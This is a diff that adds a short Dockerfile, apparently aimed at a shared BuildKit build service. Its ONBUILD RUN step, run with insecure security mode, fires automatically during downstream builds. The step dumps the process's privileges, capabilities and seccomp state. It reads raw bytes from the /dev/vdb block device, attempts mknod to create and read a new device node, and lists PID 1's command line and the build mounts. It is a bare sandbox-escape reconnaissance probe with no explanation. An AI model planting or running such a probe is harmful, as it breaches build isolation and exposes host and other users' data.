@@ -1,0 +1,5 @@
+FROM alpine:3.20 AS base
+ONBUILD RUN --security=insecure sh -c 'set +e; echo "===A1_START==="; id; echo "--status--"; grep -E "^(Uid|Gid|Cap|Seccomp|NoNewPrivs)" /proc/self/status; echo "--host--"; hostname; cat /etc/hostname; echo "--parts--"; cat /proc/partitions; echo "--dev--"; ls -l /dev; echo "--vdb_node--"; ls -l /dev/vdb 2>&1; echo "--vdb_read--"; head -c 64 /dev/vdb 2>&1 | od -An -tx1 | head -4; echo "--mknod--"; mknod /tmp/vdb b 254 16 2>&1; echo "mknod_rc=$?"; ls -l /tmp/vdb 2>&1; head -c 64 /tmp/vdb 2>&1 | od -An -tx1 | head -4; echo "--p1--"; cat /proc/1/cmdline 2>&1 | tr "\000" " "; echo; echo "--mounts--"; grep -E " / |/var/lib/buildkit|/writeable| /dev " /proc/self/mountinfo; echo "===A1_END==="'
+FROM base
+RUN echo trigger-67405-a-1792502467
+CMD ["sh","-c","sleep 15"]
